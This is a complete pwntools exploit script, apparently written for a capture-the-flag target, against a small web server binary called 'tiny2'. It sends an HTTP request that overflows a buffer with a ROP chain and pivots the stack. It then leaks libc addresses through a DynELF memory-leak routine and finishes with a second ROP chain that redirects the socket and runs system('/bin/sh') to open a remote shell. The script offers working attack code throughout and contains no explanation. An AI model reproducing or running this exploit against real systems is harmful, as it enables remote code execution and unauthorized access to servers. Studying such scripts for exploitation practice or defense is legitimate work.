#!/usr/bin/env python

import time, urllib
from pwn import *

context(arch='amd64', word_size=64, os='linux')

elf = ELF('./tiny2')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
#libc = ELF('./puppa-libc')
rop = ROP(elf)
ADDR = '127.0.0.1'
#ADDR = '10.10.10.89'
PORT = 1111

'''
0x0000000000401fd0 : mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
0x00000000004011d8 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401787 : pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004011dc : pop r15 ; ret
'''

elf.checksec()

def p64u(x):
	return urllib.quote_plus(struct.pack('<Q', x))

# rop =  p64u(0x4011dd)			# pop rdi ; ret
# rop += p64u(0x4)				# sockfd
# rop += p64u(0x4011db)			# pop rsi ; pop r15 ; ret
# rop += p64u(0x603270)			# rwx addr
# rop += p64u(0xffffffffffffffff)	# garbage for r15
# rop += p64u(0x400cf0)			# <read@plt>
# rop += p64u(0x40178a)			# pop rsp ; ret
# rop += p64u(0x603270)			# rwx addr

bss = elf.symbols['__bss_start']
pivot = 0x603270
pivot2 = 0x603a70
rop.read(0x4, pivot)
rop.migrate(pivot)
#print rop.dump()

r = remote(ADDR, PORT)
r.send('GET ' + 'A'*568 + urllib.quote_plus(rop.chain()) + '\n\n')
r.recvuntil('File not found')

count = 0

@MemLeak
def leak(addr):
	global count

	'''
	if count % 2 == 0:
		pivot3 = pivot2
	else:
		pivot3 = pivot

	count = count + 1
	'''
	pivot3 = pivot

	rop = ROP(elf)

	rop.write(4, addr, context.bytes)
	rop.read(4, pivot3, 0x118)
	rop.migrate(pivot3)
	
	#print rop.dump()
	r.send(rop.chain() + '\n')

	data = r.recv(10000)
	#print "Leaked %#x\n%s" % (addr, hexdump(data))

	return data

def exploit(de):
	#libc = de.libc
	libc.address = de.lookup(None, 'libc')

	rop = ROP(libc)
	rop.dup2(4, 0)
	rop.dup2(4, 1)
	rop.dup2(4, 2)
	rop.system(libc.search('/bin/sh').next())
	rop.exit()

	#print rop.dump()
	#r.send(rop.chain())
	r.send('A'*8*16 + rop.chain())
	
	r.interactive()
	r.close()

de = DynELF(leak, None, elf, True)

exploit(de)
